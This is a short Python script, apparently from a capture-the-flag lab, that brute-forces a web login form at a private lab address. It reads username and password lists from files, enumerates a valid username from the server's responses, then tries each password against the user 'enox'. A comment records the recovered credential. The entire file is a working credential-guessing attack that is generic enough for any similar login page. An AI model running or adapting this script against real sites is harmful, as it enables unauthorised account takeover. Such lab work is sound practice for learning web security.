#!/usr/bin/env python3

import requests

userlist = [a.strip() for a in  open("userid").readlines() ]
passwords = [a.strip() for a in  open("credentials.txt").readlines() ]

# print(userlist)
# print(passwords)

url = "http://10.10.206.210/sUp3r-s3cr3t/"

def attempt(username, password):
	r = requests.post(url+"authenticate.php", data = {

			"username" : username,
			"password" : password,
			"submit" : "Login",
		})
	return r

# This first told me that I could determine the username
# for username in userlist:
	# for password in passwords:

	# 	print(f"trying {username}:{password}")
	# 	print(attempt(username,password).text)
	# 	exit()


# for username in userlist:
# 	password = "anything"
# 	print(f"trying {username}:{password}")
# 	print(attempt(username,password).text)

username = "enox"
for password in passwords:
	print(f"trying {username}:{password}")
	print(attempt(username,password).text)
	
# Credentials found to be:
# enox:P@ssword1234